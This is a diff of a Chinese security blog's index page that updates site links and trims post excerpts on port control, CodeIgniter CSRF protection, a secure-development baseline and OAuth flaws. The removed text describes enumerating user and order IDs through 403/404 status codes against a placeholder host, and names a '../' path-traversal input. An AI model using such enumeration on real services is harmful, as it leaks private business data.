@@ -5,13 +5,13 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://yoursite.com">
+  <link rel="dns-prefetch" href="http://wismartzy.github.io">
   <title>Wismartzy&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="Worker Security">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Wismartzy's Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://wismartzy.github.io/index.html">
 <meta property="og:site_name" content="Wismartzy's Blog">
 <meta property="og:description" content="Worker Security">
 <meta name="twitter:card" content="summary">
@@ -21,7 +21,7 @@
     <link rel="alternative" href="/atom.xml" title="Wismartzy&#39;s Blog" type="application/atom+xml">
   
   
-    <link rel="icon" href="/favicon.png">
+    <link rel="icon" href="/images/favicon.ico">
   
   <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
   <style type="text/css">
@@ -45,7 +45,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="null" class="js-avatar">
+			<img src="/images/wismartzy.png" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">Wismartzy</a></h1>
@@ -68,8 +68,6 @@
     			
             
     			
-    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
-    			
             
     			
     			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
@@ -79,7 +77,11 @@
 		<nav class="header-nav">
 			<div class="social">
 				
+					<a class="github" target="_blank" href="https://github.com/wismartzy" title="github"><i class="icon-github"></i></a>
+		        
 					<a class="mail" target="_blank" href="mailto:wismartzy@gmail.com" title="mail"><i class="icon-mail"></i></a>
+		        
+					<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 		        
 			</div>
 		</nav>
@@ -97,7 +99,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="null" class="js-avatar">
+				<img src="/images/wismartzy.png" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">Wismartzy</h1>
@@ -114,7 +116,11 @@
 			<nav class="header-nav">
 				<div class="social">
 					
+						<a class="github" target="_blank" href="https://github.com/wismartzy" title="github"><i class="icon-github"></i></a>
+			        
 						<a class="mail" target="_blank" href="mailto:wismartzy@gmail.com" title="mail"><i class="icon-mail"></i></a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 			        
 				</div>
 			</nav>
@@ -140,6 +146,90 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-port-scan" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/02/19/port-scan/">不得不说的端口扫描</a>
+    </h1>
+  
+
+        
+        <a href="/2017/02/19/port-scan/" class="archive-article-date">
+  	<time datetime="2017-02-19T03:40:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。</p>
+<h1 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h1><p>大致上可以定下如下规则：</p>
+<ul>
+<li>非业务端口一概不对外开放</li>
+</ul>
+<blockquote>
+<p>可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针对业务添加需要开放的端口，这样避免了管理工作上的混乱。</p>
+</blockquote>
+<ul>
+<li>管理端口必须经过内部统一认证登录，必要时可以加上二次验证。</li>
+</ul>
+<blockquote>
+<p>如果有堡垒机当然最好了，我在开发运维跳板机的过程就嵌入了 Google Authenticator 二次验证因子，使得员工登录服务器除了验证静态密钥外，还需要验证动态密码。</p>
+</blockquote>
+<ul>
+<li>对那些开放外网权限的服务，需要做深入的渗透测试。</li>
+</ul>
+<blockquote>
+<p>当然这并不能说要求渗透测试找出所有安全问题，这是不可能的，但是要保证不能携带高危漏洞上线，并且要求做到在收到安全告警时能迅速定位到问题，这才是最主要的。</p>
+</blockquote>
+<p>严格按照上面的规则执行，抵御一些脚本小子的恶意攻击还是绰绰有余的。</p>
+        
+          <a class="article-more-a" href="/2017/02/19/port-scan/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/02/19/port-scan/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-how-codeigniter-do-CSRF-protection" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -160,7 +250,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>关于如何启用 CSRF 防护，Codeigniter(CI) 官方<a href="http://codeigniter.org.cn/user_guide/libraries/security.html" target="_blank" rel="external">文档</a>有详细说明。</p>
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>关于如何启用 CSRF 防护，Codeigniter(CI) 官方<a href="http://codeigniter.org.cn/user_guide/libraries/security.html">文档</a>有详细说明。</p>
 <p>CSRF 的防御一般比较通用的方案有：</p>
 <ul>
 <li>Referer验证</li>
@@ -169,19 +259,12 @@
 </ul>
 <p>Referer 验证用起来比较简单，但由于各浏览器在 Referer 字段上有着不同的标准，再加上部分验证代码存在逻辑漏洞，所以，一直以来这个方案存在被绕过的风险，效果不是特别理想。而验证码防御的方案又对用户体验有比较大的影响，所以目前来说，基于 token 的验证是最为可用的 CSRF 防护方案，大量开源框架都采用这种方式来抵御 CSRF 攻击的。当然，也有组合这几种的防御方案，效果比单一使用某一方案更优。</p>
 <h2 id="CI-amp-CSRF"><a href="#CI-amp-CSRF" class="headerlink" title="CI &amp; CSRF"></a>CI &amp; CSRF</h2><p>CI 默认并未开启 CSRF 防御</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /application/config/config.php</span></span><br><span class="line">$config[<span class="string">'csrf_protection'</span>] = <span class="keyword">FALSE</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /application/config/config.php</span></div><div class="line">$config[<span class="string">'csrf_protection'</span>] = <span class="keyword">FALSE</span>;</div></pre></td></tr></table></figure>
 <p>若将该值设置为<code>TRUE</code>，则 CI 会对每个 POST 请求进行 CSRF Verify</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /system/core/Input.php</span></span><br><span class="line">		<span class="comment">// CSRF Protection check</span></span><br><span class="line">		<span class="keyword">if</span> ($this-&gt;_enable_csrf === <span class="keyword">TRUE</span> &amp;&amp; ! is_cli())</span><br><span class="line">		&#123;</span><br><span class="line">			$this-&gt;security-&gt;csrf_verify();</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
-<p>上面这一步是在 Input 类的 construct 函数里进行的，这意味着一旦开启 CSRF 防御，将全局作用于所有请求，这样不得不为每个 POST 表单添加一个 token 字段，否则请求会被中断。使用 CI 内置的 <code>form_open()</code> 函数将会自动地在表单中插入一个隐藏的 CSRF 字段，但是如果用 Ajax 去提交 POST 请求，就得为每个请求手动添加 csrf_cookie_name 字段，随请求一起传给服务端。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /system/core/Security.php</span></span><br><span class="line">	<span class="comment">/**</span><br><span class="line">	 * CSRF Verify</span><br><span class="line">	 *</span><br><span class="line">	 * <span class="doctag">@return</span>	CI_Security</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">csrf_verify</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="comment">// If it's not a POST request we will set the CSRF cookie</span></span><br><span class="line">		<span class="keyword">if</span> (strtoupper($_SERVER[<span class="string">'REQUEST_METHOD'</span>]) !== <span class="string">'POST'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> $this-&gt;csrf_set_cookie();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Check if URI has been whitelisted from CSRF checks</span></span><br><span class="line">		<span class="keyword">if</span> ($exclude_uris = config_item(<span class="string">'csrf_exclude_uris'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			$uri = load_class(<span class="string">'URI'</span>, <span class="string">'core'</span>);</span><br><span class="line">			<span class="keyword">foreach</span> ($exclude_uris <span class="keyword">as</span> $excluded)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (preg_match(<span class="string">'#^'</span>.$excluded.<span class="string">'$#i'</span>.(UTF8_ENABLED ? <span class="string">'u'</span> : <span class="string">''</span>), $uri-&gt;uri_string()))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> $this;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do the tokens exist in both the _POST and _COOKIE arrays?</span></span><br><span class="line">		<span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_POST[$this-&gt;_csrf_token_name], $_COOKIE[$this-&gt;_csrf_cookie_name])</span><br><span class="line">			<span class="keyword">OR</span> $_POST[$this-&gt;_csrf_token_name] !== $_COOKIE[$this-&gt;_csrf_cookie_name]) <span class="comment">// Do the tokens match?</span></span><br><span class="line">		&#123;</span><br><span class="line">			$this-&gt;csrf_show_error();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// We kill this since we're done and we don't want to polute the _POST array</span></span><br><span class="line">		<span class="keyword">unset</span>($_POST[$this-&gt;_csrf_token_name]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Regenerate on every submission?</span></span><br><span class="line">		<span class="keyword">if</span> (config_item(<span class="string">'csrf_regenerate'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Nothing should last forever</span></span><br><span class="line">			<span class="keyword">unset</span>($_COOKIE[$this-&gt;_csrf_cookie_name]);</span><br><span class="line">			$this-&gt;_csrf_hash = <span class="keyword">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;_csrf_set_hash();</span><br><span class="line">		$this-&gt;csrf_set_cookie();</span><br><span class="line"></span><br><span class="line">		log_message(<span class="string">'info'</span>, <span class="string">'CSRF token verified'</span>);</span><br><span class="line">		<span class="keyword">return</span> $this;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p><code>csrf_verify()</code> 函数对非 POST 请求直接写 CSRF cookie，POST 请求就判断是否在 URI 的白名单里面，若不在白名单再进行判断 _POST 和 _COOKIE 里是否有 CSRF token，并且判断两者是否相等，只有在存在且相等的情况下才通过校验，否则提示错误403。这一步的逻辑其实是建立在发起 CSRF 攻击的黑客理论上无法获取第三方 cookie 基础上的，得不到 cookie 便无法构造表单里的 token，就过不了这里的 <code>csrf_verify()</code>。</p>
-<p>在校验完成后，为了不污染 _POST 数组，CI 调用 unset 函数处理了 _POST 数组里的 csrf token，重新生成新的 token 并写到 cookie。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /system/core/Security.php</span></span><br><span class="line">	<span class="comment">/**</span><br><span class="line">	 * CSRF Set Cookie</span><br><span class="line">	 *</span><br><span class="line">	 * <span class="doctag">@codeCoverageIgnore</span></span><br><span class="line">	 * <span class="doctag">@return</span>	CI_Security</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">csrf_set_cookie</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		$expire = time() + $this-&gt;_csrf_expire;</span><br><span class="line">		$secure_cookie = (bool) config_item(<span class="string">'cookie_secure'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($secure_cookie &amp;&amp; ! is_https())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		setcookie(</span><br><span class="line">			$this-&gt;_csrf_cookie_name,</span><br><span class="line">			$this-&gt;_csrf_hash,</span><br><span class="line">			$expire,</span><br><span class="line">			config_item(<span class="string">'cookie_path'</span>),</span><br><span class="line">			config_item(<span class="string">'cookie_domain'</span>),</span><br><span class="line">			$secure_cookie,</span><br><span class="line">			config_item(<span class="string">'cookie_httponly'</span>)</span><br><span class="line">		);</span><br><span class="line">		log_message(<span class="string">'info'</span>, <span class="string">'CSRF cookie sent'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $this;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>上面是设置 CSRF 防御 cookie 的函数，cookie 属性可以从配置文件里读取</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /application/config/config.php</span></span><br><span class="line">$config[<span class="string">'csrf_token_name'</span>] = <span class="string">'csrf_test_name'</span>;</span><br><span class="line">$config[<span class="string">'csrf_cookie_name'</span>] = <span class="string">'csrf_cookie_name'</span>;</span><br><span class="line">$config[<span class="string">'csrf_expire'</span>] = <span class="number">7200</span>;</span><br><span class="line">$config[<span class="string">'csrf_regenerate'</span>] = <span class="keyword">TRUE</span>;</span><br><span class="line">$config[<span class="string">'csrf_exclude_uris'</span>] = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>
-<p>cookie 有效期默认是7200秒，也就是2小时，由于一旦开启 CSRF 防御，就是全局作用于所有的请求，所以有时候难免会有误伤，但 CI 并没做到在 controller 层动态配置，而是在 Input 类初始化的位置调用 <code>csrf_verify()</code> 函数完成校验。当然，CI 开放了白名单策略，也就是配置文件里的 <code>$config[&#39;csrf_exclude_uris&#39;]</code> ，可以把不需要做 CSRF 防御的 uri 添加到该值里面。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从源码里不难看出 CI 通过比较 _COOKIE 和 _POST 中的 token 值来做 CSRF 防御，咋一看似乎觉得 _COOKIE 和 _POST 的内容对客户端来说都是可控的，但仔细思考一下，在 CSRF 的攻击场景下，攻击者是无法读取到受害者的 cookie 信息的，这也是该防御方式有效的前提所在。</p>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /system/core/Input.php</span></div><div class="line">		<span class="comment">// CSRF Protection check</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_enable_csrf === <span class="keyword">TRUE</span> &amp;&amp; ! is_cli())</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;security-&gt;csrf_verify();</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2016/09/27/how-codeigniter-do-CSRF-protection/#more">more >></a>
+        
       
 
       
@@ -251,72 +334,9 @@
 <p>登录错误必须统一字样，比如用户名或密码错误时，返回“错误的用户名或密码”。</p>
 <p>服务端抛出的错误禁止直接返回给接口，仅返回“Error”字样，错误内容打到相关服务日志。</p>
 </blockquote>
-<h3 id="登录与注销"><a href="#登录与注销" class="headerlink" title="登录与注销"></a>登录与注销</h3><blockquote>
-<p>有登录功能的系统就必须有注销功能。</p>
-</blockquote>
-<h3 id="后台界面"><a href="#后台界面" class="headerlink" title="后台界面"></a>后台界面</h3><blockquote>
-<p>后台页面必须对用户身份和访问权限进行检查</p>
-</blockquote>
-<h3 id="账号锁定"><a href="#账号锁定" class="headerlink" title="账号锁定"></a>账号锁定</h3><blockquote>
-<p>所有提供外网访问功能的系统，必须启用账号登录失败锁定策略（如3分钟20次登录失败，锁定30分钟）</p>
-</blockquote>
-<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><h3 id="管理系统"><a href="#管理系统" class="headerlink" title="管理系统"></a>管理系统</h3><blockquote>
-<p>后台管理系统或其他重要系统登录必须设置验证码</p>
-</blockquote>
-<h3 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h3><blockquote>
-<p>必须设置有效期，且有效期内仅可使用一次</p>
-</blockquote>
-<h3 id="发送频率"><a href="#发送频率" class="headerlink" title="发送频率"></a>发送频率</h3><blockquote>
-<p>以短信或邮件方式发送验证码时，必须限制同一ID或接受者的验证码发送频率</p>
-</blockquote>
-<h2 id="会话安全"><a href="#会话安全" class="headerlink" title="会话安全"></a>会话安全</h2><h3 id="会话超时"><a href="#会话超时" class="headerlink" title="会话超时"></a>会话超时</h3><blockquote>
-<p>会话token/session必须设有超时机制</p>
-</blockquote>
-<h3 id="会话更新"><a href="#会话更新" class="headerlink" title="会话更新"></a>会话更新</h3><blockquote>
-<p>用户登录成功后，必须更新会话ID，用户注销/重置密码后，必须强制token/session过期。</p>
-</blockquote>
-<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><blockquote>
-<p>cookie参数中session id等认证相关的字段必须设置HttpOnly</p>
-<p>HTTPS传输必须为cookie设置secure</p>
-</blockquote>
-<h2 id="上传下载"><a href="#上传下载" class="headerlink" title="上传下载"></a>上传下载</h2><h3 id="文件判断"><a href="#文件判断" class="headerlink" title="文件判断"></a>文件判断</h3><blockquote>
-<p>对上传文件后缀进行白名单限制，严格校验文件内容与类型是否匹配</p>
-</blockquote>
-<h3 id="目录跳转"><a href="#目录跳转" class="headerlink" title="目录跳转"></a>目录跳转</h3><blockquote>
-<p>禁止客户端自定义文件下载路径（如：使用../../../../进行跳转）</p>
-</blockquote>
-<h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><blockquote>
-<p>存储上传文件的目录必须禁止脚本执行权限</p>
-</blockquote>
-<h2 id="传输安全"><a href="#传输安全" class="headerlink" title="传输安全"></a>传输安全</h2><h3 id="参数提交"><a href="#参数提交" class="headerlink" title="参数提交"></a>参数提交</h3><blockquote>
-<p>禁止通过 HTTP GET 方式提交不安全算法处理过的用户密码</p>
-</blockquote>
-<h3 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h3><blockquote>
-<p>禁止通过 HTTP 明文传输用户登录密码、支付密码、银行卡号等敏感数据</p>
-</blockquote>
-<h3 id="支付安全"><a href="#支付安全" class="headerlink" title="支付安全"></a>支付安全</h3><blockquote>
-<p>禁止在支付密码的传输过程中使用不安全算法</p>
-</blockquote>
-<h2 id="存储安全"><a href="#存储安全" class="headerlink" title="存储安全"></a>存储安全</h2><h3 id="敏感数据存储"><a href="#敏感数据存储" class="headerlink" title="敏感数据存储"></a>敏感数据存储</h3><blockquote>
-<p>禁止数据库、日志文件中明文存储用户登录密码、支付密码、银行卡号、身份证号码等敏感数据</p>
-</blockquote>
-<h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="审计内容"><a href="#审计内容" class="headerlink" title="审计内容"></a>审计内容</h3><blockquote>
-<p>自建用户系统，必须记录：时间/用户ID/操作/结果/IP等信息</p>
-</blockquote>
-<h3 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h3><blockquote>
-<p>除审计用户外，其他人员不应该具备日志修改、删除、清空的权限，必须记录清空日志的行为</p>
-</blockquote>
-<h3 id="日志存储"><a href="#日志存储" class="headerlink" title="日志存储"></a>日志存储</h3><blockquote>
-<p>禁止将日志直接保存在可被浏览器访问到的WEB目录中</p>
-</blockquote>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><blockquote>
-<p>禁止在代码中留置后门</p>
-</blockquote>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>基线制定事简单，关键在于如何推动研发遵循，而这个问题又可以开一篇文章聊了。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li>VIP产品设计与开发红线 v2.0</li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2016/09/22/Product-Design-and-Development-Safety-Baseline/#more">more >></a>
+        
       
 
       
@@ -392,26 +412,9 @@
 <p>404 即该订单号对应的订单不存在</p>
 <p>403 即该订单存在，但不允许我查看</p>
 </blockquote>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么可以怎么利用呢？订单属于商业敏感数据，APP 开发者当然不愿意自己的实际订单数据被用户或竞争对手拿到，在这里我可以根据遍历订单编号得到的服务端返回状态码（<code>403</code> 即订单存在）确定该 APP 的实际订单量。</p>
-<p>类似场景还有，当获取用户个人主页时候，Restful 接口类似如下：</p>
-<blockquote>
-<p>GET /users/123/profile HTTP/1.1</p>
-<p>Host: target.com</p>
-</blockquote>
-<p>修改 <code>123</code> 为其他数字，根据服务端返回状态码是否为 <code>403</code> 即可判断对应用户是否存在，在确定注册用户 id 递增的情况下，那么可以在月初注册一个账户拿到用户 id，记为 <code>num1</code>，月末注册另一账户并拿到用户 id，记为 <code>num2</code>，再遍历下刚刚的接口，就能筛选出 <code>num1</code>、<code>num2</code> 之间的用户数量了，也即为一个月的新增用户数。</p>
-<p>对创业公司来说，倘若投资人以某种渠道拿到了你们产品的真实注册用户数和订单量，你觉得他还会在乎你 PPT 上的内容吗？当然，这有点夸张了XD。</p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在我看来，当一个用户访问的资源不属于自己时，服务端返回 <code>403</code> 和 <code>404</code> 都是可以的，<code>403</code> 指 Forbidden，禁止用户访问不属于自己的资源，<code>404</code> 指 Not Found，用户不能看到不属于自己的资源，也能解释通。另外，也有服务端会返回 <code>401</code>，<code>401</code> 指 Unauthorized，用户未授权访问不属于自己的资源，依然合理。</p>
-<p>那到底该用哪一个呢？去翻了下 <code>RFC2616</code>，对 <code>403</code> 状态码的解释里有这么一句：</p>
-<blockquote>
-<p>If the server does not wish to make this information available to the client, the status code 404 (Not Found) can be used instead.</p>
-</blockquote>
-<p>大概意思就是，只要服务端不想暴露信息给客户端，接口都统一返回 <code>404</code>，完整部分可以看下图：</p>
-<p><img src="/images/rfc-1.png" alt="status code rfc"></p>
-<p>针对上面我碰到的场景来说，总结一句话就是</p>
-<blockquote>
-<p>未授权用户访问有效资源时，服务端统一返回 404 更安全</p>
-</blockquote>
-
+        
+          <a class="article-more-a" href="/2016/09/09/hui-shuo-hua-de-zhuang-tai-ma/#more">more >></a>
+        
       
 
       
@@ -476,81 +479,9 @@
 <p>CSRF防护初始请求<code>/connect/provider</code>的时候，总是使用和需要<code>state</code>参数，不允许动态的<code>redirect_uri</code>，默认不允许<code>response_type=hash</code>（以前是<code>token</code>），废弃<code>refresh_token</code>和<code>token</code>，而不是用<code>appsecret_proof</code>去认证每个<code>access_token</code>，仔细检查用户想要连接的服务提供商账户，<code>access_token</code>永不过期（把它当做公开的<code>user_id</code>）</p>
 <p>1、用户点击连接服务提供商的按钮，无论是发起一个<code>POST</code>表单提交（受<code>CSRF Token</code>防护的）到<code>/connect/provider_name</code>，还是由<code>GET</code>导航到<code>/connect/provider?csrf_token=TOKEN</code>，初始步骤一定要受<code>CSRF</code>防护，它不应该被来自其他源的连接触发，必须有来自于用户的明确的确认。</p>
 <p>2、在服务端<code>/connect/provider</code>客户端的控制器应该确认<code>csrf_token</code>和来自于<code>session</code>里的<code>token</code>一致，然后生成<code>state token</code>（CSRF Token，确保OAuth流程完整性），并命名为<code>&lt;provider&gt;-state</code>存储在<code>session</code>里。然后跳转到<code>provider.com/oauth/authorize?client_id=CLIENT_ID&amp;redirect_uri=CLIENT/callback&amp;state=STAT</code>，<code>scope</code>参数是可选的（应该仅仅允许被认证过的客户端接触一些关键的作用域）</p>
-<p>3、服务提供商检查<code>redirect_uri</code>是否在重定向URI的白名单中（主机，路径，查询参数，<code>hash</code>必须是静态的）。每一个<code>redirect_uri</code>它不能是一个参数，还必须要有响应的返回类型，默认是<code>query</code>，移动app是<code>hash</code>。<code>state</code>参数必须由服务供应商要求（尽管规范上说该参数是可选的—对大多数开发者来说这就是不需要的代名词）。</p>
-<p>4、用户在服务提供商域下看到同意/拒绝按钮，在点击同意按钮后受<code>CSRF Token</code>防护的<code>POST</code>表单被提交到相同的<code>URL</code>（不要像<code>Outlook</code>或<code>Doorkeeper</code>或者在授权的时候<code>CSRF</code>攻击服务提供商）。</p>
-<p>5、<code>response_type</code>为<code>query</code>时候重定向到<code>CLIENT/callback?access_token=TOKEN&amp;state=STATE</code>（所有的<code>token</code>被存储在中央服务器，并且每个API请求用<code>appsecret_proof</code>签名），<code>response_type</code>为<code>hash</code>的时候会重定向到<code>CLIENT/callback#access_token=TOKEN&amp;state=STATE</code>（所有的<code>token</code>被存储在本地应用里，并不需要<code>appsecret_proof</code>）。这两种情况下客户端都一定要检查<code>STATE</code>是否等于来自<code>season</code>的<code>provider-state</code>。</p>
-<p>6、为什么<code>access_token</code>从不过期？因为我们不再需要<code>refresh_token/code</code>。用<code>refresh_token</code>攻击者能使用<code>access_token</code>获得一个窗口去发送垃圾邮件或者下载所有受害者的社交图片。仅当<code>access_token</code>过期，根据规范，客户端应该使用<code>refresh_token</code>和<code>client_secret</code>去获取一个新的<code>token</code>。除了这个场景，我们将需要最早由Facebook引入的<code>appsecret_proof</code>。如果<code>response_type</code>为<code>query</code>的时候，<code>token</code>被返回，那么每一个到服务提供商的请求一定要有<code>access_token</code>和<code>appsecret_proof=hash_hmac(&#39;sha256&#39;, $access_token, $client_secret);</code>。现在如果攻击者泄露<code>access_token</code>，<code>token</code>毫无价值。即使他们偷了你的<code>client_secret</code>，你也能很简单的换掉。</p>
-<p>7、可选的，但是是推荐的。在连接账户之前，你应该询问用户是否要连接到例如<code>myfbemail@email.com</code>的Facebook账户。因为有很多的攻击比如<code>cookie forcing</code>, <code>login/logout CSRF</code>, <code>RECONNECT</code>能够静默将用户登录到服务提供商的恶意账户里。</p>
-<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>这个文档描述常见的<code>OAuth/Single Sign On/OpenID</code>相关的漏洞。很多跨站交互容易受到不同类型的泄露和劫持。</p>
-<p>Hacker和开发者都能通过阅读它收获益处。</p>
